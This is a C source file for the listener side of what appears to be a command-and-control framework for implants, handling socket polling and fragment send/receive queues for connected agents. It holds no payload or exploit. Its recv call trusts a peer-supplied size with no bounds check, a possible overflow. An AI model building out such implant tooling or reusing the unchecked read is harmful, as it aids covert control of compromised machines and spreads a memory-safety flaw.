/*
listener_comms.c

This function will send and receive buffers to the agents.

*/

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <poll.h>
#include <string.h>
#include <pthread.h>
#include <stdbool.h>
#include <signal.h>

#include <sys/socket.h>
#include <arpa/inet.h>

#include "utility.h"
#include "queue.h"
#include "implant.h"
#include "base.h"
#include "listener_comms.h"

// Global variables
// Receive Queue
extern Queue* listener_receive_queue;
extern pthread_mutex_t listener_receive_queue_lock;
// Send Queue
extern Queue* listener_send_queue;
extern pthread_mutex_t listener_send_queue_lock;
// SIGINT flag
extern volatile sig_atomic_t all_sigint;

STATIC int listener_receive(Connected_Agents* CA){
	Fragment fragment;
	int poll_count;
	
	struct pollfd *pfds = CA->pfds;
	
	poll_count = poll(pfds, CA->nfds, POLL_TIMEOUT);
	if (poll_count == -1){
		printf("ERROR poll\n");
		return RET_ERROR;
	}
	else if (poll_count > 0){
		pthread_mutex_lock(&CA->lock);
		for (int i = 0; i < CA->nfds; i++){
			// check if ready to read
			if (pfds[i].revents & POLLIN){
				debug_print("POLLIN  %d\n", pfds[i].fd);
				int nbytes = recv(pfds[i].fd, (void*)&fragment, CA->agents[pfds[i].fd].next_recv_size + HEADER_SIZE, 0);
				if (nbytes == 0){
					// close file descriptor and remove from poll array
					printf("%s\n", "connection closed");
					agent_delete(CA, i);
				}
				else if (nbytes == -1){
					printf("ERROR recv error\n");
					pthread_mutex_unlock(&CA->lock);
					return RET_ERROR;
				}
				else{
					// Convert each value of header to host order
					// this only works if each header value is 32 bits long
					for (int32_t* value = (int32_t*)&fragment; value < (int32_t*)&fragment.buffer; value++){
						*value = ntohl(*value);
					}

					debug_print("received fragment: type: %d, index: %d, total_size: %d, next_size: %d\n", \
						fragment.header.type, \
						fragment.header.index, \
						fragment.header.total_size, \
						fragment.header.next_size);

					// update next read size
					CA->agents[pfds[i].fd].next_recv_size = fragment.header.next_size;
					pthread_mutex_unlock(&CA->lock);
					
					Queue_Message* message = malloc(sizeof(Queue_Message));
					message->fragment = calloc(1, nbytes + 1);
					message->id = pfds[i].fd;
					message->size = nbytes;
					memcpy(message->fragment, &fragment, nbytes);
					
					debug_print("adding message to queue: id: %d, size: %d\n", message->id, message->size);
					enqueue(listener_receive_queue, &listener_receive_queue_lock, message);
					memset(&fragment, 0, sizeof(fragment));
				}
			}
		}
	}

    return RET_OK;
}

STATIC int listener_send(){
	Queue_Message* message;
	Fragment* fragment;

	if (!(message = dequeue(listener_send_queue, &listener_send_queue_lock))) return RET_OK;

	fragment = message->fragment;

	debug_print("sending fragment: type: %d, index: %d, total_size: %d, next_size: %d\n", \
		fragment->header.type, \
		fragment->header.index, \
		fragment->header.total_size, \
		fragment->header.next_size);

	// Convert each value of header to network order
	// this only works if each header value is 32 bits long
	for (int32_t* value = (int32_t*)fragment; value < (int32_t*)&fragment->buffer; value++){
		*value = htonl(*value);
	}
	
	if (sendall(message->id, (void*)message->fragment, message->size) == RET_ERROR){
		printf("Send error\n");
		return RET_ERROR;
	}
	
	free(message->fragment);
	free(message);
	return RET_OK;
}

void *listener_receive_thread(void *vargp){
	Connected_Agents* CA = vargp;

	while(!all_sigint){
		if (listener_receive(CA) != RET_OK){
			all_sigint = true;
			printf("listener_receive_thread error\n");
		}
	}
	debug_print("%s\n", "listener_receive_thread done");
	return 0;
}

void *listener_send_thread(void *vargp){
	Connected_Agents* CA = vargp;

	while(!all_sigint){
		if (listener_send(CA) != RET_OK){
			all_sigint = true;
			printf("listener_send_thread error\n");
		}
	}
	debug_print("%s\n", "listener_send_thread done");
	return 0;
}